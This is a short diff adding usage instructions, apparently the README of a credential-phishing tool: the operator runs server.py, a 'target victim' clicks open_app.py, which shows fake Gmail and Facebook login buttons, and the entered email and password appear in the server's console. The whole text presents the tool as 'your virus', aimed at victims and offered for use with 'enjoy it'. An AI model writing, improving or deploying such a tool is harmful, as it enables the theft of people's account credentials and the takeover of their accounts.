@@ -1,0 +1,9 @@
+1. open server.py
+ - In reality,wait until target victim click your virus
+2. open open_app.py
+ - In reality,target victim will click this file
+3  click gmail button or facebook button
+4  fill gmail and password and then click login
+5  watch console or terminal of server.py 
+enjoy it
+* you can change Interface more beautiful if you have programming knowledge
